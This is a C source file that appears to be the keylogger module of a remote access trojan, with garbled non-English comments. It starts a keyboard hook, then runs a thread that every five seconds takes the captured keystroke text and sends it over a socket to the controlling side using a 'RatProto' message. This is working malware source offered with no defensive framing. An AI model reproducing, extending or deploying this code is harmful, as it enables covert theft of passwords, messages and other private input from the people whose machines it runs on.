#include "KeyBoard.h"

BOOL flag = TRUE;
SOCKET keysockfd = 0;


//���ͼ��̼�¼
void KeyLog(void)
{
	RatProto ratPro;
	ratPro.RatId = KEY_REPLY;
	while (!flag)
	{
		char* szText = GetText();
		int dwSize = sizeof(RatProto)+strlen(szText)+1;
		ratPro.RatLen = dwSize;
		SendCmd(keysockfd,(char*)(&ratPro),sizeof(RatProto));
		SendCmd(keysockfd,szText,strlen(szText)+1);
		Sleep(5000);
	}
}

//�رռ��̼��
BOOL Stop2Hook(SOCKET sockfd)
{
	if (!flag)
	{
		StopHook();
		flag = TRUE;
	}

	return TRUE;
}


//�������̼��
HHOOK Start2Hook(SOCKET sockfd)
{
	keysockfd = sockfd;
	HHOOK hHook = NULL;
	if (flag)
	{
		if (StopHook && StartHook)
		{
			hHook = StartHook();
		}
		flag = FALSE;
		CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)KeyLog,NULL,NULL,NULL);
	}


	return hHook;
}